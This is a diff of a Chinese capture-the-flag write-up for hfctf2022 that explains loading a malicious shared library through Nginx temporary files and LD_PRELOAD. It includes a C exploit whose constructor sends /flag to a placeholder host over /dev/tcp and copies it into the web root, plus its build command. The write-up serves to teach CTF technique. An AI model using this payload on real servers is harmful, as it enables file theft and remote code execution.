@@ -3,7 +3,9 @@
 仅仅能控制环境变量，参考p神的文章，本题是在可控环境变量的条件下执行sh -c "echo hfctf2022"，但是本题和p神的环境不一样。
 
 ### Nginx临时文件
-Nginx用于反向代理时，从后端web应用接受响应并缓存到本地，然后发往客户端。响应较小时缓存到内存，如果响应过大则或发往客户端速度太慢导致内存缓冲区满，则会将一部分缓冲区内容写入临时文件中，腾出缓冲区部分空间。[source code分析](https://blog.csdn.net/kai_ding/article/details/21297101)
+~~Nginx用于反向代理时，从后端web应用接受响应并缓存到本地，然后发往客户端。响应较小时缓存到内存，如果响应过大则或发往客户端速度太慢导致内存缓冲区满，则会将一部分缓冲区内容写入临时文件中，腾出缓冲区部分空间。[source code分析](https://blog.csdn.net/kai_ding/article/details/21297101)~~(查错了，不是这个知识点)
+
+Nginx会读取客户端请求正文(body)，有一个的缓冲区用于存储正文。如果请求正文大于缓冲区，则整个正文或仅其部分将写入临时文件，默认情况下缓冲区大小等于两个内存页。
 
 贴一处抄来的Nginx代码：
 ```
@@ -67,3 +69,27 @@ int main() {
 如果预先存在test.txt则不会存在/proc/pid/fd/3这个软链接，且a.out本身输出buff为空，如图：
 ![nil](https://github.com/local-h0st/CTF/blob/main/writeups/pics/test_unlink_02.png)
 此时在getchar挡住，close未执行的情况下，目录下我自己创建的test.txt就已经消失不见了。
+
+### LD_PRELOAD
+LD_PRELOAD在进程启动前设置。\_\_attribute__是一个编译属性，GNU C特色之一，其中__attribute__((constructor))确保此函数在main函数之前被调用。贴个exp：
+```
+// hacklib.c
+#include <stdlib.h>
+#include <string.h>
+__attribute__ ((constructor)) void call ()
+{
+    unsetenv("LD_PRELOAD");
+    char str[65536];
+    system("bash -c 'cat /flag' > /dev/tcp/ip/port");
+    system("cat /flag > /var/www/html/flag");
+}
+```
+gcc hacklib.c -shared -fPIC -o hacklib.so -ldl，-ldl不加也行，最终编译得到hacklib.so文件。
+
+当我们访问php，传入参数为LD_PRELOAD=/proc/pid/fd/后，当前php脚本先会setenv，然后去执行system函数。从p神的文章中我们可以看到，system函数最终是去执行sh -c "xxx"，也就是启动一个sh进程去执行命令，获得其返回结果。由于sh是由当前php脚本开的，因此LD_PRELOAD的环境变量能被sh继承下来。所以在开sh前，hacklib.so内的call()函数就会被先执行。
+
+### 贴一份完整的Python脚本
+```
+
+```
+还是反弹shell出来的，，一顿操作虚拟机Ubuntu图形界面给我搞没了，，
